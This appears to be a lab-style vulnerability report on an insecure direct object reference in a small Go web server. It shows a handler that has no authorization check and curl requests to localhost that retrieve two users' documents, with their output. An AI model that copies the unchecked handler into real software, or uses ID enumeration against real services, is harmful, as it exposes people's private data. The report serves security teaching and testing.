# Vulnerability Exploitation Report: Insecure Direct Object Reference (IDOR)

### **Executive Summary**
This report details the discovery and exploitation of an Insecure Direct Object Reference (IDOR) vulnerability in a Go-based web application. The vulnerability exists in the `/docs/{id}` endpoint, which is responsible for retrieving and displaying documents. The application fails to implement any authorization checks, allowing an unauthenticated attacker to access any document stored on the server by simply providing its unique identifier in the URL. This grants unauthorized access to potentially sensitive information, as demonstrated by successfully retrieving documents belonging to different users.

---

### **Technical Deep-Dive**

#### **Vulnerability Description**
The application is vulnerable to Insecure Direct Object Reference (IDOR). The `docHandler` function retrieves a document ID directly from the user-controlled URL path and uses it to look up a document in a global map. There are no subsequent checks to verify if the user making the request has the necessary permissions to view the requested document.

#### **Vulnerable Code Analysis**
The vulnerability is located in the `docHandler` function within `code/vulnerable.go`.

```go
// code/vulnerable.go

// ... (struct and map definition)
var docs = map[string]Document{
	"1": {ID: "1", OwnerID: "alice", Content: "Alice's secret notes"},
	"2": {ID: "2", OwnerID: "bob", Content: "Bob's top secret"},
}

// ... (main function)

func docHandler(w http.ResponseWriter, r *http.Request) {
	// 1. ID is taken directly from the user-controlled URL path.
	id := strings.TrimPrefix(r.URL.Path, "/docs/")
	if id == "" {
		http.Error(w, "missing id", http.StatusBadRequest)
		return
	}

	// 2. The user-supplied ID is used to access the data object directly.
	//    No authentication or authorization check is performed.
	doc, ok := docs[id]
	if !ok {
		http.NotFound(w, r)
		return
	}

	// 3. Sensitive document content is returned to the user.
	fmt.Fprintf(w, "Document ID: %s\nOwner: %s\nContent: %s\n", doc.ID, doc.OwnerID, doc.Content)
}
```
The root cause is the direct trust and use of the `id` variable extracted from the URL. The application assumes that if a user requests a document ID, they are authorized to view it, which is a critical security flaw.

---

### **Exploitation Methodology**

#### **Discovery and Analysis**
1.  **Code Review:** The initial analysis of the `main` function revealed an HTTP server routing `/docs/` requests to `docHandler`.
2.  **Handler Inspection:** A review of `docHandler` showed that it extracts a path segment and uses it as a key to retrieve data from a map named `docs`.
3.  **Data Source Identification:** The global `docs` map was located, revealing pre-populated sensitive data for users "alice" and "bob" with corresponding IDs "1" and "2".
4.  **Vulnerability Hypothesis:** The lack of any session management, user authentication, or ownership checks led to the hypothesis of an IDOR vulnerability. It was predicted that any document could be accessed by iterating through known or guessable IDs.

#### **Exploitation Process**
The vulnerability was confirmed by starting the web server and using `curl` to directly request document objects by their IDs.

1.  **Start the Server:** The vulnerable Go application was compiled and executed.
    ```bash
    go run code/vulnerable.go &
    ```
2.  **Access First User's Data:** A request was sent to the endpoint with the ID for "alice's" document.
    ```bash
    curl http://localhost:8080/docs/1
    ```
3.  **Access Second User's Data:** A second request was sent with the ID for "bob's" document to confirm that data belonging to other users was also accessible.
    ```bash
    curl http://localhost:8080/docs/2
    ```

---

### **Proof of Successful Exploitation**

The final payload is the URL path itself, which contains the identifier of the targeted object.

**Payload 1: Accessing Alice's Document**
```bash
curl http://localhost:8080/docs/1
```
**Output:**
```text
Document ID: 1
Owner: alice
Content: Alice's secret notes
```

**Payload 2: Accessing Bob's Document**
```bash
curl http://localhost:8080/docs/2
```
**Output:**
```text
Document ID: 2
Owner: bob
Content: Bob's top secret
```
The output clearly demonstrates that an unauthenticated attacker can retrieve sensitive documents belonging to any user, confirming the successful exploitation of the IDOR vulnerability.